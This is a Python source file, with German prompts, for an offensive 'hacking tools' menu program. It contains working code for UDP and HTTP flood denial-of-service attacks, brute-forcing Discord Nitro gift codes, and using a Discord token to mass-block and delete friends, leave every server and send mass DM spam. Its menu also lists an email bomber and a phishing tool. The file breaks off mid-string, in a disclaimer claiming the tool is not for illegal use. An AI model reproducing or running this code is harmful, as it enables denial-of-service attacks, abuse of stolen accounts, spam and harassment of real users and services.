import nmap
import os
import socket
import threading
import requests
import time
import smtplib
import sys
import shutil
import random
import json
import string
import phonenumbers
import webbrowser
from colorama import Fore, Style, init


# Nitro Generator Configuration
class bcolors:
    Green = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    DARK_BLUE = "\033[34m"
    ENDC = "\033[0m"


class NitroConfig:
    def __init__(self):
        self.webhook_url = ""
        self.username_webhook = "Nitro Generator"
        self.avatar_webhook = "https://i.imgur.com/1X0y2zD.png"
        self.color_webhook = 0x00ff00
        self.discord_banner = """
         ____  _                _   _       _   _  __ _           _   _             
        |  _ \(_) ___  _ __   | \ | |_   _| \ | |/ _(_)_ __   __| | | | ___ _ __  
        | | | | |/ _ \| '_ \  |  \| | | | |  \| | |_| | '_ \ / _` | | |/ _ \ '__| 
        | |_| | | (_) | | | |_| |\  | |_| | |\  |  _| | | | | (_| |_| |  __/ |    
        |____/|_|\___/|_| |_(_)_| \_|\__,_|_| \_|_| |_|_| |_|\__,_(_)_|\___|_|    
        """


def discord_nitro_generator():
    config = NitroConfig()

    def send_webhook(url_nitro):
        if not config.webhook_url:
            return

        payload = {
            'embeds': [{
                'title': 'Nitro Valid !',
                'description': f"**Nitro:**\n```{url_nitro}```",
                'color': config.color_webhook,
                'footer': {
                    "text": config.username_webhook,
                    "icon_url": config.avatar_webhook,
                }
            }],
            'username': config.username_webhook,
            'avatar_url': config.avatar_webhook
        }

        headers = {'Content-Type': 'application/json'}
        try:
            requests.post(config.webhook_url, data=json.dumps(payload), headers=headers, timeout=5)
        except:
            pass

    def nitro_check():
        while True:
            try:
                code_nitro = ''.join([random.choice(string.ascii_uppercase + string.digits) for _ in range(16)])
                url_nitro = f'https://discord.gift/{code_nitro}'
                response = requests.get(
                    f'https://discordapp.com/api/v6/entitlements/gift-codes/{code_nitro}?with_application=false&with_subscription_plan=true',
                    timeout=5
                )
                if response.status_code == 200:
                    print(
                        f"{Fore.GREEN}[+]{Fore.RESET} Gültiger Nitro-Code gefunden: {Fore.CYAN}{url_nitro}{Fore.RESET}")
                    send_webhook(url_nitro)
                else:
                    print(f"{Fore.RED}[-]{Fore.RESET} Ungültiger Nitro-Code: {url_nitro}")
            except:
                continue

    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print(f"\n{Fore.CYAN}=== Discord Nitro Generator ==={Fore.RESET}\n")

        use_webhook = input(f"{Fore.YELLOW}[?]{Fore.RESET} Webhook verwenden? (j/n): ").lower() == 'j'
        if use_webhook:
            config.webhook_url = input(f"{Fore.YELLOW}[?]{Fore.RESET} Webhook-URL: ").strip()
            if not config.webhook_url.startswith('http'):
                print(f"{Fore.RED}[!] Ungültige Webhook-URL!{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return

        try:
            threads = int(input(f"{Fore.YELLOW}[?]{Fore.RESET} Anzahl der Threads: "))
            threads = max(1, min(threads, 50))  # Limit between 1 and 50 threads
        except ValueError:
            print(f"{Fore.RED}[!] Ungültige Eingabe! Verwende Standardwert (5){Fore.RESET}")
            threads = 5

        print(
            f"\n{Fore.YELLOW}[!]{Fore.RESET} Starte Nitro-Generator mit {threads} Threads... (Drücken Sie Strg+C zum Beenden)")

        # Start threads
        for _ in range(threads):
            t = threading.Thread(target=nitro_check, daemon=True)
            t.start()

        # Keep main thread alive
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Nitro-Generator wird beendet...{Fore.RESET}")
        time.sleep(1)
    except Exception as e:
        print(f"{Fore.RED}[!] Fehler: {str(e)}{Fore.RESET}")

    input("\nDrücken Sie Enter, um fortzufahren...")


def discord_status_changer():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print(f"\n{Fore.CYAN}=== Discord Token Status Changer ==={Fore.RESET}\n")

        token = input(f"{Fore.YELLOW}[?]{Fore.RESET} Discord Token: ").strip()
        if not token:
            print(f"{Fore.RED}[!] Kein Token eingegeben!{Fore.RESET}")
            input("\nDrücken Sie Enter, um fortzufahren...")
            return

        try:
            status_count = int(input(f"{Fore.YELLOW}[?]{Fore.RESET} Anzahl der Statustexte (max 4): "))
            status_count = max(1, min(status_count, 4))  # Limit between 1 and 4
        except ValueError:
            print(f"{Fore.RED}[!] Ungültige Eingabe! Verwende Standardwert (1){Fore.RESET}")
            status_count = 1

        statuses = []
        for i in range(status_count):
            status = input(f"{Fore.YELLOW}[?]{Fore.RESET} Status {i + 1}: ")
            if status:
                statuses.append(status)

        if not statuses:
            print(f"{Fore.RED}[!] Keine gültigen Statustexte eingegeben!{Fore.RESET}")
            input("\nDrücken Sie Enter, um fortzufahren...")
            return

        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }

        print(f"\n{Fore.YELLOW}[!] Status-Wechsler gestartet. Drücken Sie Strg+C zum Beenden.{Fore.RESET}")

        while True:
            for status in statuses:
                try:
                    payload = {"custom_status": {"text": status}}
                    response = requests.patch(
                        "https://discord.com/api/v9/users/@me/settings",
                        headers=headers,
                        json=payload
                    )
                    if response.status_code == 200:
                        print(f"{Fore.GREEN}[+]{Fore.RESET} Status geändert zu: {Fore.CYAN}{status}{Fore.RESET}")
                    else:
                        print(f"{Fore.RED}[-] Fehler beim Ändern des Status: {response.status_code}{Fore.RESET}")
                    time.sleep(5)  # 5 Sekunden warten vor der nächsten Änderung
                except Exception as e:
                    print(f"{Fore.RED}[-] Fehler: {str(e)}{Fore.RESET}")
                time.sleep(5)

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Status-Wechsler wird beendet...{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Fehler: {str(e)}{Fore.RESET}")

    input("\nDrücken Sie Enter, um fortzufahren...")


def discord_block_friends():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print(f"\n{Fore.CYAN}=== Discord Token Block Friends ==={Fore.RESET}\n")

        token = input(f"{Fore.YELLOW}[?]{Fore.RESET} Discord Token: ").strip()
        if not token:
            print(f"{Fore.RED}[!] Kein Token eingegeben!{Fore.RESET}")
            input("\nDrücken Sie Enter, um fortzufahren...")
            return

        # Verify token
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        try:
            response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
            if response.status_code != 200:
                print(f"{Fore.RED}[!] Ungültiges Token!{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return
        except Exception as e:
            print(f"{Fore.RED}[!] Fehler beim Überprüfen des Tokens: {str(e)}{Fore.RESET}")
            input("\nDrücken Sie Enter, um fortzufahren...")
            return

        print(f"\n{Fore.YELLOW}[!] Freunde werden blockiert...{Fore.RESET}")

        # Get friends list
        try:
            friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
            if not friends:
                print(f"{Fore.YELLOW}[!] Keine Freunde gefunden.{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return

            def block_friends(friends_chunk):
                for friend in friends_chunk:
                    try:
                        requests.put(
                            f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}',
                            headers=headers,
                            json={"type": 2}  # 2 = block
                        )
                        username = f"{friend['user']['username']}#{friend['user']['discriminator']}"
                        print(f"{Fore.GREEN}[+]{Fore.RESET} Blockiert: {Fore.CYAN}{username}{Fore.RESET}")
                    except Exception as e:
                        print(f"{Fore.RED}[-] Fehler beim Blockieren: {str(e)}{Fore.RESET}")

            # Process in chunks of 3 to avoid rate limiting
            chunk_size = 3
            threads = []
            for i in range(0, len(friends), chunk_size):
                chunk = friends[i:i + chunk_size]
                t = threading.Thread(target=block_friends, args=(chunk,))
                t.start()
                threads.append(t)
                time.sleep(0.5)  # Small delay between starting threads

            # Wait for all threads to complete
            for t in threads:
                t.join()

            print(f"\n{Fore.GREEN}[!] Fertig! Alle Freunde wurden blockiert.{Fore.RESET}")

        except Exception as e:
            print(f"{Fore.RED}[!] Fehler: {str(e)}{Fore.RESET}")

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Vorgang abgebrochen.{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Unerwarteter Fehler: {str(e)}{Fore.RESET}")

    input("\nDrücken Sie Enter, um fortzufahren...")


def discord_delete_friends():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print(f"\n{Fore.CYAN}=== Discord Token Delete Friends ==={Fore.RESET}\n")

        token = input(f"{Fore.YELLOW}[?]{Fore.RESET} Discord Token: ").strip()
        if not token:
            print(f"{Fore.RED}[!] Kein Token eingegeben!{Fore.RESET}")
            input("\nDrücken Sie Enter, um fortzufahren...")
            return

        # Verify token
        headers = {'Authorization': token, 'Content-Type': 'application/json'}
        try:
            response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
            if response.status_code != 200:
                print(f"{Fore.RED}[!] Ungültiges Token!{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return
        except Exception as e:
            print(f"{Fore.RED}[!] Fehler beim Überprüfen des Tokens: {str(e)}{Fore.RESET}")
            input("\nDrücken Sie Enter, um fortzufahren...")
            return

        print(f"\n{Fore.YELLOW}[!] Freunde werden gelöscht...{Fore.RESET}")

        # Get friends list
        try:
            friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
            if not friends:
                print(f"{Fore.YELLOW}[!] Keine Freunde gefunden.{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return

            def delete_friends(friends_chunk):
                for friend in friends_chunk:
                    try:
                        response = requests.delete(
                            f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}',
                            headers=headers
                        )
                        username = f"{friend['user']['username']}#{friend['user']['discriminator']}"
                        if response.status_code == 204:
                            print(f"{Fore.GREEN}[+]{Fore.RESET} Gelöscht: {Fore.CYAN}{username}{Fore.RESET}")
                        else:
                            print(f"{Fore.RED}[-] Fehler beim Löschen: {response.status_code}{Fore.RESET}")
                    except Exception as e:
                        print(f"{Fore.RED}[-] Fehler: {str(e)}{Fore.RESET}")

            # Process in chunks of 3 to avoid rate limiting
            chunk_size = 3
            threads = []
            for i in range(0, len(friends), chunk_size):
                chunk = friends[i:i + chunk_size]
                t = threading.Thread(target=delete_friends, args=(chunk,))
                t.start()
                threads.append(t)
                time.sleep(0.5)  # Small delay between starting threads

            # Wait for all threads to complete
            for t in threads:
                t.join()

            print(f"\n{Fore.GREEN}[!] Fertig! Alle Freunde wurden gelöscht.{Fore.RESET}")

        except Exception as e:
            print(f"{Fore.RED}[!] Fehler: {str(e)}{Fore.RESET}")

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Vorgang abgebrochen.{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[!] Unerwarteter Fehler: {str(e)}{Fore.RESET}")

    input("\nDrücken Sie Enter, um fortzufahren...")


def discord_token_leaver():
    try:
        import requests
        import threading

        # Print banner
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print(f"{Fore.CYAN}=== Discord Token Leaver ===\n")

        def leave_server(guilds, token):
            for guild in guilds:
                try:
                    response = requests.delete(
                        f'https://discord.com/api/v9/users/@me/guilds/{guild["id"]}',
                        headers={
                            'Authorization': token,
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                        }
                    )
                    if response.status_code in [200, 204]:
                        print(
                            f"{Fore.GREEN}[+]{Fore.RESET} Erfolg: Server verlassen: {Fore.CYAN}{guild.get('name', 'Unbekannter Server')}{Fore.RESET}")
                    elif response.status_code == 400:
                        response = requests.delete(
                            f'https://discord.com/api/v9/guilds/{guild["id"]}',
                            headers={
                                'Authorization': token,
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                            }
                        )
                        if response.status_code in [200, 204]:
                            print(
                                f"{Fore.GREEN}[+]{Fore.RESET} Erfolg: Server verlassen: {Fore.CYAN}{guild.get('name', 'Unbekannter Server')}{Fore.RESET}")
                        else:
                            print(
                                f"{Fore.RED}[-] Fehler {response.status_code}: Konnte Server nicht verlassen: {guild.get('name', 'Unbekannter Server')}{Fore.RESET}")
                    else:
                        print(
                            f"{Fore.RED}[-] Fehler {response.status_code}: Konnte Server nicht verlassen: {guild.get('name', 'Unbekannter Server')}{Fore.RESET}")
                except Exception as e:
                    print(
                        f"{Fore.RED}[-] Fehler beim Verlassen von {guild.get('name', 'Unbekannter Server')}: {str(e)}{Fore.RESET}")

        # Get Discord token
        token = input(f"{Fore.GREEN}[+]{Fore.RESET} Bitte geben Sie den Discord-Token ein: ").strip()

        if not token:
            print(f"{Fore.RED}[-] Kein Token angegeben.{Fore.RESET}")
            input("\nDrücken Sie Enter, um fortzufahren...")
            return

        headers = {
            'Authorization': token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }

        try:
            # Get user's guilds
            response = requests.get(
                'https://discord.com/api/v9/users/@me/guilds',
                headers=headers
            )

            if response.status_code != 200:
                print(f"{Fore.RED}[-] Fehler beim Abrufen der Server. Statuscode: {response.status_code}{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return

            guilds = response.json()

            if not guilds:
                print(f"{Fore.YELLOW}[!] Keine Server gefunden.{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return

            print(f"\n{Fore.YELLOW}[!] Starte das Verlassen von {len(guilds)} Servern...{Fore.RESET}")

            # Process in chunks to avoid rate limiting
            chunk_size = 3
            threads = []
            for i in range(0, len(guilds), chunk_size):
                chunk = guilds[i:i + chunk_size]
                t = threading.Thread(target=leave_server, args=(chunk, token))
                t.start()
                threads.append(t)
                time.sleep(0.6)  # Rate limiting

            # Wait for all threads to complete
            for t in threads:
                t.join()

            print(f"\n{Fore.GREEN}[!] Fertig! Alle Server wurden verarbeitet.{Fore.RESET}")

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Netzwerkfehler: {str(e)}{Fore.RESET}")

    except Exception as e:
        print(f"{Fore.RED}[-] Unerwarteter Fehler: {str(e)}{Fore.RESET}")

    input("\nDrücken Sie Enter, um fortzufahren...")


def discord_token_language_changer():
    try:
        import requests
        import time
        import random

        # Print banner
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print(f"{Fore.CYAN}=== Discord Token Language Changer ===\n")

        # Get Discord token
        token = input(f"{Fore.GREEN}[+]{Fore.RESET} Bitte geben Sie den Discord-Token ein: ").strip()

        if not token:
            print(f"{Fore.RED}[-] Kein Token angegeben.{Fore.RESET}")
            input("\nDrücken Sie Enter, um fortzufahren...")
            return

        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }

        # Verify token
        try:
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if r.status_code != 200:
                print(f"{Fore.RED}[-] Ungültiger Token oder Fehler bei der Verbindung zu Discord.{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return

            # Get number of cycles
            try:
                amount = int(input(f"\n{Fore.GREEN}[+]{Fore.RESET} Anzahl der Sprachwechsel: "))
                if amount <= 0:
                    print(f"{Fore.RED}[-] Bitte geben Sie eine positive Zahl ein.{Fore.RESET}")
                    input("\nDrücken Sie Enter, um fortzufahren...")
                    return
            except ValueError:
                print(f"{Fore.RED}[-] Ungültige Eingabe. Bitte geben Sie eine Zahl ein.{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return

            # Available languages
            languages = ['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs']
            language_names = {
                'ja': 'Japanisch',
                'zh-TW': 'Traditionelles Chinesisch',
                'ko': 'Koreanisch',
                'zh-CN': 'Vereinfachtes Chinesisch',
                'th': 'Thailändisch',
                'uk': 'Ukrainisch',
                'ru': 'Russisch',
                'el': 'Griechisch',
                'cs': 'Tschechisch'
            }

            print(f"\n{Fore.YELLOW}[!] Starte Sprachwechsel...{Fore.RESET}")

            for i in range(amount):
                try:
                    time.sleep(0.6)  # Rate limiting
                    random_language = random.choice(languages)
                    setting = {'locale': random_language}

                    response = requests.patch(
                        "https://discord.com/api/v9/users/@me/settings",
                        headers=headers,
                        json=setting
                    )

                    if response.status_code == 200:
                        print(
                            f"{Fore.GREEN}[+]{Fore.RESET} Erfolg: Sprache zu {Fore.CYAN}{language_names.get(random_language, random_language)}{Fore.RESET} geändert")
                    else:
                        print(f"{Fore.RED}[-] Fehler: {response.status_code}{Fore.RESET}")

                except Exception as e:
                    print(f"{Fore.RED}[-] Fehler: {str(e)}{Fore.RESET}")

            print(f"\n{Fore.GREEN}[!] Fertig!{Fore.RESET}")

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Netzwerkfehler: {str(e)}{Fore.RESET}")

    except Exception as e:
        print(f"{Fore.RED}[-] Unerwarteter Fehler: {str(e)}{Fore.RESET}")

    input("\nDrücken Sie Enter, um fortzufahren...")


def discord_token_mass_dm():
    try:
        import requests
        import threading
        import time

        # Print banner
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()
        print(f"{Fore.CYAN}=== Discord Token Mass DM ===\n")

        # Get Discord token
        token = input(f"{Fore.GREEN}[+]{Fore.RESET} Bitte geben Sie den Discord-Token ein: ").strip()

        if not token:
            print(f"{Fore.RED}[-] Kein Token angegeben.{Fore.RESET}")
            input("\nDrücken Sie Enter, um fortzufahren...")
            return

        # Verify token
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }

        try:
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if response.status_code != 200:
                print(f"{Fore.RED}[-] Ungültiger Token oder Fehler bei der Verbindung zu Discord.{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return

            # Get message
            message = input(f"{Fore.GREEN}[+]{Fore.RESET} Nachricht: ").strip()
            if not message:
                print(f"{Fore.RED}[-] Keine Nachricht eingegeben.{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return

            # Get number of repetitions
            try:
                repetitions = int(input(f"{Fore.GREEN}[+]{Fore.RESET} Anzahl der Wiederholungen: "))
                if repetitions <= 0:
                    raise ValueError
            except ValueError:
                print(
                    f"{Fore.RED}[-] Ungültige Anzahl der Wiederholungen. Bitte geben Sie eine positive Zahl ein.{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return

            # Get channels
            print(f"{Fore.YELLOW}[!] Lade Kanäle...{Fore.RESET}")
            channels = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()

            if not channels:
                print(f"{Fore.YELLOW}[!] Keine DM-Kanäle gefunden.{Fore.RESET}")
                input("\nDrücken Sie Enter, um fortzufahren...")
                return

            print(f"{Fore.GREEN}[+] {len(channels)} Kanäle gefunden.{Fore.RESET}")

            # Function to send DMs
            def send_dm(channel, user, message_text):
                try:
                    response = requests.post(
                        f"https://discord.com/api/v9/channels/{channel['id']}/messages",
                        headers=headers,
                        json={"content": message_text}
                    )
                    if response.status_code == 200:
                        print(f"{Fore.GREEN}[+]{Fore.RESET} Nachricht an {Fore.CYAN}{user}{Fore.RESET} gesendet")
                    else:
                        print(f"{Fore.RED}[-] Fehler beim Senden an {user}: {response.status_code}{Fore.RESET}")
                except Exception as e:
                    print(f"{Fore.RED}[-] Fehler beim Senden an {user}: {str(e)}")

            # Process in chunks to avoid rate limiting
            chunk_size = 3
            processes = []

            for i in range(repetitions):
                print(f"\n{Fore.YELLOW}[!] Starte Durchlauf {i + 1}/{repetitions}{Fore.RESET}")

                for j in range(0, len(channels), chunk_size):
                    chunk = channels[j:j + chunk_size]
                    threads = []

                    for channel in chunk:
                        if 'recipients' in channel and channel['recipients']:
                            for recipient in channel['recipients']:
                                user = f"{recipient['username']}#{recipient['discriminator']}"
                                t = threading.Thread(
                                    target=send_dm,
                                    args=(channel, user, message)
                                )
                                t.start()
                                threads.append(t)
                                time.sleep(0.5)  # Rate limiting

                    # Wait for all threads in this chunk to complete
                    for t in threads:
                        t.join()

                print(f"{Fore.GREEN}[!] Durchlauf {i + 1}/{repetitions} abgeschlossen{Fore.RESET}")
                time.sleep(1)  # Small delay between repetitions

            print(f"\n{Fore.GREEN}[!] Mass DM erfolgreich abgeschlossen!{Fore.RESET}")

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Netzwerkfehler: {str(e)}{Fore.RESET}")

    except Exception as e:
        print(f"{Fore.RED}[-] Unerwarteter Fehler: {str(e)}{Fore.RESET}")

    input("\nDrücken Sie Enter, um fortzufahren...")


def discord_tools_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()

        # Print the menu header in a dark blue box with green text
        title = " +[+[+[DISCORD-TOOLS]+]+]+ "
        title_line = "═" * (len(title) + 4)
        print(f"\n{bcolors.DARK_BLUE}╔{title_line}╗")
        print(f"║  {bcolors.Green}{title}{bcolors.DARK_BLUE}  ║")
        print(f"╚{title_line}╝{bcolors.ENDC}")

        # Discord tools menu items
        print(f"{bcolors.Green}[1]{bcolors.ENDC} +[+[+[Discord Nitro Generator]+]+]+")
        print(f"{bcolors.Green}[2]{bcolors.ENDC} +[+[+[Discord Token Status Changer]+]+]+")
        print(f"{bcolors.Green}[3]{bcolors.ENDC} +[+[+[Discord Token Block Friends]+]+]+")
        print(f"{bcolors.Green}[4]{bcolors.ENDC} +[+[+[Discord Token Delete Friends]+]+]+")
        print(f"{bcolors.Green}[5]{bcolors.ENDC} +[+[+[Discord Token Language Changer]+]+]+")
        print(f"{bcolors.Green}[6]{bcolors.ENDC} +[+[+[Discord Token Leaver]+]+]+")
        print(f"{bcolors.Green}[7]{bcolors.ENDC} +[+[+[Discord Token Mass DM]+]+]+")
        print(f"{bcolors.Green}[8]{bcolors.ENDC} +[+[+[Discord Token Login]+]+]+")
        print(f"{bcolors.Green}[9]{bcolors.ENDC} +[+[+[Zurück zum Hauptmenü]+]+]+")

        choice = input(f"\n{Fore.GREEN}Bitte wählen Sie eine Option: ").strip().lower()

        if choice == '1':
            discord_nitro_generator()
        elif choice == '2':
            discord_status_changer()
        elif choice == '3':
            discord_block_friends()
        elif choice == '4':
            discord_delete_friends()
        elif choice == '5':
            discord_token_language_changer()
        elif choice == '6':
            discord_token_leaver()
        elif choice == '7':
            discord_token_mass_dm()
        elif choice == '8':
            from discord_token_login import discord_token_login
            discord_token_login()
        elif choice == '9':
            return
        else:
            print(f"{Fore.RED}Ungültige Auswahl. Bitte versuchen Sie es erneut.")
            input("\nDrücken Sie Enter, um fortzufahren...")


def show_menu():
    # Define all menu items in order
    menu_items = [
        (1, "IP DDOS Attack"),
        (2, "Port Scanner"),
        (3, "IP Tracker"),
        (4, "DDOS Attack"),
        (5, "Website Scanner"),
        (6, "Email Bomber"),
        (7, "Phishing Tool"),
        (8, "Number-Finder"),
        (9, "IP Scanner"),
        (10, "IP Map Finder"),
    ]

    current_page = 1
    items_per_page = 5  # Show 5 items per page + navigation box

    total_pages = (len(menu_items) + items_per_page - 1) // items_per_page

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()

        # Print the menu header in a dark blue box with green text
        if current_page == 1:
            title = " +[+[+[HAUPTMENÜ]+]+]+ "
        else:
            title = " +[+[+[2-PAGE]+]+]+ "

        title_line = "═" * (len(title) + 4)
        print(f"\n{bcolors.DARK_BLUE}╔{title_line}╗")
        print(f"║  {bcolors.Green}{title}{bcolors.DARK_BLUE}  ║")
        print(f"╚{title_line}╝{bcolors.ENDC}")
        print(f"{bcolors.Green}[99]{bcolors.ENDC} +[+[+[Beenden]+]+]+")
        print()  # Add a blank line for better readability

        # Calculate start and end index for current page
        start_idx = (current_page - 1) * items_per_page
        end_idx = min(start_idx + items_per_page, len(menu_items))

        # Print menu items for current page with green numbers and white text
        if current_page == 1:

            # First page shows first 5 items
            for i in range(min(5, len(menu_items))):
                num, text = menu_items[i]
                print(f"{bcolors.BLUE}[{num}]{bcolors.ENDC} +[+[+[{bcolors.BLUE}{text}{bcolors.ENDC}]+]+]+")

            # Navigation box for first page
            box_content = "98. Info   n=next-page   99. Beenden"
            box_width = len(box_content) + 4  # 2 spaces on each side

            print(f"\n{bcolors.BLUE}╔{'═' * box_width}╗{bcolors.ENDC}")
            print(f"{bcolors.BLUE}║  {box_content}  ║{bcolors.ENDC}")
            print(f"{bcolors.BLUE}╚{'═' * box_width}╝{bcolors.ENDC}")
        else:
            # Second page shows remaining items (items 5-9)
            for i in range(5, len(menu_items)):
                num, text = menu_items[i]
                print(f"{bcolors.BLUE}[{num}]{bcolors.ENDC} +[+[+[{bcolors.BLUE}{text}{bcolors.ENDC}]+]+]+")

            # Navigation box for second page
            box_content = "b=back-page"
            box_width = len(box_content) + 4  # 2 spaces on each side

            print(f"\n{bcolors.BLUE}╔{'═' * box_width}╗{bcolors.ENDC}")
            print(f"{bcolors.BLUE}║  {box_content}  ║{bcolors.ENDC}")
            print(f"{bcolors.BLUE}╚{'═' * box_width}╝{bcolors.ENDC}")

        print(f"\n{bcolors.BLUE}Seite {current_page}/{total_pages}{bcolors.ENDC}")
        print(
            f"{bcolors.BLUE}Drücken Sie 'n' für die nächste Seite, 'b' für die vorherige Seite, 'd' für Discord-Tools oder '99' zum Beenden{bcolors.ENDC}")

        choice = input(f"\n{bcolors.BLUE}Bitte wählen Sie eine Option: {bcolors.ENDC}").strip().lower()

        if choice == '99':
            print("\nDas Programm wird beendet...")
            time.sleep(1)
            sys.exit(0)
        elif choice == 'd':
            discord_tools_menu()
        elif choice == 'n' and current_page < total_pages:
            current_page += 1
        elif choice == 'b' and current_page > 1:
            current_page -= 1
        else:
            # Check if the input is a valid menu item number
            try:
                if choice == "98":
                    show_info()
                elif choice == "1":
                    # IP DDOS Attack
                    banner()
                    print(
                        bcolors.RED + "\nWARNUNG: DDOS-Angriffe sind illegal und können zu strafrechtlichen Konsequenzen führen!")
                    confirm = input("Möchten Sie wirklich fortfahren? (ja/nein): ")
                    if confirm.lower() != 'ja':
                        print("Vorgang abgebrochen.")
                        input("\nDrücken Sie Enter, um fortzufahren...")
                        continue
                    try:
                        ip = input("\nIP Target : ")
                        port = int(input("Port      : "))
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        bytes = random._urandom(1490)
                        sent = 0
                        print("\n" + bcolors.RED + "Angriff gestartet! Drücken Sie Strg+C zum Beenden...")
                        while True:
                            sock.sendto(bytes, (ip, port))
                            sent = sent + 1
                            port = port + 1
                            print(f"{bcolors.YELLOW}Gesendete Pakete an {ip} über Port: {port}")
                            if port == 65534:
                                port = 1
                    except KeyboardInterrupt:
                        print("\nAngriff gestoppt.")
                    except Exception as e:
                        print(f"\nFehler: {str(e)}")
                    input("\nDrücken Sie Enter, um fortzufahren...")
                elif choice == "2":
                    port_scanner()
                    input("\nDrücken Sie Enter, um fortzufahren...")
                elif choice == "3":
                    ip_tracker_menu()
                elif choice == "4":
                    # DDOS Attack
                    target = input("Ziel-URL oder IP eingeben (z.B. example.com): ")
                    port = 80  # Default HTTP port
                    fake_ip = '192.168.0.1'  # Fake IP to hide real IP

                    print(
                        "\n" + bcolors.RED + "WARNUNG: DDOS-Angriffe sind illegal und können zu strafrechtlichen Konsequenzen führen!")
                    confirm = input("Möchten Sie wirklich fortfahren? (ja/nein): ")

                    if confirm.lower() != 'ja':
                        print("Vorgang abgebrochen.")
                        input("\nDrücken Sie Enter, um fortzufahren...")
                        continue

                    already_connected = 0

                    def attack():
                        nonlocal already_connected
                        while True:
                            try:
                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                s.connect((target, port))
                                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                                s.close()

                                already_connected += 1
                                if already_connected % 10 == 0:  # Only print every 10 requests
                                    print(f"Anfragen gesendet: {already_connected}")
                            except Exception as E:
                                print(f"Fehler: {E}")
                                break

                    # Start multiple threads for the attack
                    print("\nStarte DDOS-Angriff (Drücken Sie Strg+C zum Beenden)...")
                    try:
                        for i in range(100):  # Reduced number of threads
                            thread = threading.Thread(target=attack)
                            thread.daemon = True
                            thread.start()

                        # Keep the main thread alive
                        while True:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print("\nAngriff gestoppt.")
                        input("\nDrücken Sie Enter, um fortzufahren...")
                elif choice == "5":
                    website_scanner_menu()
                elif choice == "6":
                    # Email Bomber
                    banner()
                    bomb = Email_Bomber()
                    bomb.bomb()
                    bomb.email()
                    bomb.attack()
                    input("\nDrücken Sie Enter, um fortzufahren...")
                elif choice == "7":
                    start_web_server()
                    input("\nDrücken Sie Enter, um fortzufahren...")
                elif choice == "8":
                    phone_number_analyzer()
                elif choice == "9":
                    ip_scanner()
                elif choice == "10":
                    ip_map_finder()
                else:
                    print(f"{Fore.RED}Ungültige Auswahl. Bitte versuchen Sie es erneut.")
                    input("\nDrücken Sie Enter, um fortzufahren...")
            except ValueError:
                print(f"{Fore.RED}Ungültige Eingabe. Bitte geben Sie eine Zahl ein.")
                input("\nDrücken Sie Enter, um fortzufahren...")


def show_info():
    print(bcolors.YELLOW + """             +[+[+[Hier sind die infos]+]+]+ 
Das Tool wurde von mir erstellt und ist nicht für illegale Zwecke gedacht.
